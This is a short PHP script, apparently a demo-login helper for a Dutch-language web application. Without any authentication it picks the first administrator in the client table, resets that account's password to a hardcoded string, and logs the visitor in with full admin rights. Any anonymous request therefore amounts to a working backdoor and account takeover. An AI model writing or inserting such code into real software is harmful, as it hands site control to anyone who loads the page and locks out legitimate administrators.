<?php
session_start();
require_once 'dbconnect.php';

$stmt = $db->query("SELECT id, first_name, last_name FROM client WHERE isadmin = 'J' AND id <> 0 ORDER BY id LIMIT 1");
$admin = $stmt->fetch(PDO::FETCH_ASSOC);

if ($admin) {
    $demoPassword = password_hash('halalpork123', PASSWORD_DEFAULT);
    $update = $db->prepare("UPDATE client SET pswrd = ? WHERE id = ?");
    $update->execute([$demoPassword, (int)$admin['id']]);

    $_SESSION['benJeErAl'] = true;
    $_SESSION['SoortToegang'] = 'Beheer';
    $_SESSION['welkNummerIsDit'] = (int)$admin['id'];
    $_SESSION['wieBenJeDan'] = trim($admin['first_name'] . ' ' . $admin['last_name']);

    header('Location: pro-active-get.php');
    exit();
}

header('Location: login.php?msg=' . urlencode('Geen beheerder gevonden.'));
exit();
?>
